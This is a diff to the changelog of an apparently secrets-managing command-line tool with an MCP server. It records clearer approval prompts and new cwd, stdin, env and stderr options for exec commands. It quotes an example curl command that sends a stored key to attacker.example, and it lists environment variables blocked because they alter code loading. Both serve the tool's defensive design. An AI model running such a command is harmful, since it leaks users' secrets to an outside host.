@@ -92,7 +92,8 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   `*`) instead.
 - Approval prompts now show what is being approved, not just a command
   name. `exec` and `exec_with_secrets` list the arguments (quoted, with
-  `${{NOKEY:…}}` placeholders shown unresolved, capped at 512 bytes), so
+  `${{NOKEY:…}}` placeholders shown unresolved, capped at 512 bytes with
+  a note of how many bytes and arguments were cut), so
   `curl https://attacker.example -H "X: ${{NOKEY:KEY}}"` no longer reads
   as a plain "curl wants KEY". `mint_token` shows the requested `for`,
   TTL and max uses, the auto-minted session token is described as
@@ -116,6 +117,18 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - The MCP server recovers from a panic in a tool handler and returns it
   as an error for that call, instead of exiting and dropping the
   session.
+- `exec` and `exec_with_secrets` take four optional parameters: `cwd`
+  (an absolute, existing directory to run in; the command must then be
+  a bare name or an absolute path), `stdin` (text fed to the command,
+  which otherwise still gets none), `env` (extra non-secret variables;
+  stored secret names are rejected, since their values would not be
+  redacted, as are variables that change what code a program loads or
+  runs, such as `PATH`, `LD_*`, `DYLD_*`, `BASH_ENV`, `NODE_OPTIONS`,
+  `PYTHON*` and `GIT_SSH*`) and `separate_stderr` (stderr returned after
+  stdout under a `[stderr]` line, each stream capped and redacted
+  separately). When any of them is set, the approval prompt shows the
+  cwd, the env entries and a preview of stdin. Leaving them out runs
+  exactly as before.
 - `nokey import --dry-run FILE` parses the file and lists the secret
   names it would import, flagging any the keyring would reject, without
   opening the keyring or writing anything.
